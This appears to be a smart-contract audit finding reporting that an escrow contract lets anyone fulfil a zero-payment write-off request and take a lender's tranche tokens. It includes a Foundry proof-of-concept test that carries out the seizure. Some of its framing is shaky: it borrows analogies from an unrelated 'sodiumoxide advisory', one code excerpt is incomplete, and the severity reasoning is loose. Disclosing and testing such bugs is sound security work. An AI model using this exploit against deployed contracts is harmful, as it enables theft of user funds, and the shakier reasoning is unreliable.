### Title
`createWriteOffRequest` accepts a degenerate zero-underlyings request, letting any fulfiller seize escrowed tranche tokens for free - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol])

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates the tranche-token leg (`amount == 0` reverts) but never validates the underlyings leg. A request with `underlyingsRequested == 0` is stored as a perfectly valid request. `fullfillWriteOffRequest` then only requires `_underlyings >= currentRequest.underlyings`, so anyone can fulfill it with `_underlyings == 0` and receive the lender's escrowed tranche tokens without paying anything — the "degenerate input produces a degenerate, state-independent outcome" pattern of the sodiumoxide advisory. [1](#0-0) [2](#0-1) 

### Finding Description
In `createWriteOffRequest`:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:86-101
function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
  if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
  if (amount == 0) revert NotAllowed();   // tranche leg validated
  IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
  userRequests[msg.sender] = WriteOffRequest({
    tranches: currentRequest.tranches + amount,
    underlyings: currentRequest.underlyings + underlyingsRequested  // may stay 0
  });
  pendingUnderlyings += underlyingsRequested;
}
```

The only check on the payment leg is implicit in `fullfillWriteOffRequest`:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:127-131
if (currentRequest.tranches == 0) revert Is0();
if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
  revert WrongRequest();
}
```

With `underlyings == 0`, `_underlyings = 0` satisfies `_underlyings < currentRequest.underlyings == false`, so fulfillment succeeds with zero payment. The fulfiller path then computes `_totFee = 0`, transfers `0` underlyings to the lender, and transfers the full escrowed `tranches` to `msg.sender` — the fulfiller. [3](#0-2) 

Tranche tokens carry redemption value (`_withdraw` redeems `amount * _tranchePrice / 1e18` in `IdleCDO.sol:493`, and during a running epoch they can be queued via `queue.requestWithdraw`), so seizing them for zero payment is direct theft of lender assets.

The broken invariant is "one receipt one payout": a write-off request is a two-sided exchange, and the contract enforces the deposit side but leaves the payment side degenerate — the deterministic "zero secret" outcome (free fulfillment) is reachable regardless of the lender's escrowed principal.

Existing guards do not stop it: `nonReentrant` is irrelevant, `EpochNotRunning`/`amount == 0` checks pass, `deleteWriteOffRequest` is only usable by the lender before a front-running fulfillment, and there is no minimum-underlyings or sanity check anywhere in the escrow. [4](#0-3) 

### Impact Explanation
Any unprivileged EOA can monitor `createWriteOffRequest` transactions and, in the same block or any later block while the epoch runs, call `fullfillWriteOffRequest(lender, request.tranches, 0)` to take the escrowed AA/BB tranche tokens paying zero underlying. Loss equals the full redemption value of the escrowed tranches (up to the lender's entire tranche position). It can also hit requests that started at a nonzero ask and were later topped up, or legacy pre-upgrade requests with `underlyings == 0`, which the code explicitly acknowledges at lines 111–112.

### Likelihood Explanation
Requires a lender to create a request with `underlyingsRequested == 0` (misconfigured UI call, fat-fingered parameter, or a request topped up before the underlyings field is set). Triggering the theft is trivial for the fulfiller: no roles, no timing constraints beyond `isEpochRunning`, and `fullfillWriteOffRequest` is callable by any wallet per its NatSpec. Attack cost is one cheap call; the payoff is the full escrowed position. Likelihood is bounded by user error, hence medium — matching the source advisory's severity.

### Recommendation
Mirror the fix applied in the advisory (reject the degenerate class of inputs): add `if (underlyingsRequested == 0) revert NotAllowed();` (or an `Is0` revert) in `createWriteOffRequest`, and defensively revert in `fullfillWriteOffRequest` when `currentRequest.underlyings == 0`. Note this must be applied carefully given the legacy-request handling — a zero-underlyings legacy request should only be exitable via `deleteWriteOffRequest`, never fulfillable.

### Proof of Concept
Foundry-style PoC (assumes the deployed `IdleCreditVaultWriteOffEscrow` wired to an `IdleCDOEpochVariant` with a running epoch and a KYC'd lender holding tranche tokens; `tranche`/`underlying` are ERC20s):

```solidity
function testZeroUnderlyingRequestSeized() external {
    // --- setup: epoch running, lender holds tranche tokens ---
    vm.prank(manager);
    cdoEpoch.startEpoch(); // isEpochRunning() == true

    uint256 tranches = 100e18;
    deal(address(tranche), lender, tranches);

    // --- lender (mis)creates a write-off request with 0 underlyingsRequested ---
    vm.startPrank(lender);
    tranche.approve(address(escrow), tranches);
    escrow.createWriteOffRequest(tranches, 0); // accepted: no zero-underlyings check
    vm.stopPrank();

    // --- attacker fulfills with zero payment ---
    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(lender, tranches, 0); // succeeds: _underlyings < 0 is false

    // attacker received all escrowed tranche tokens for free
    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, tranches);
    assertEq(underlying.balanceOf(lender), 0); // lender received nothing
}
```

Uncertainty note: I verified the escrow logic and the zero-check asymmetry directly in `contracts/IdleCreditVaultWriteOffEscrow.sol`, but did not trace whether a front-end or off-chain flow already prevents zero-underlyings requests; the contract itself does not.

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
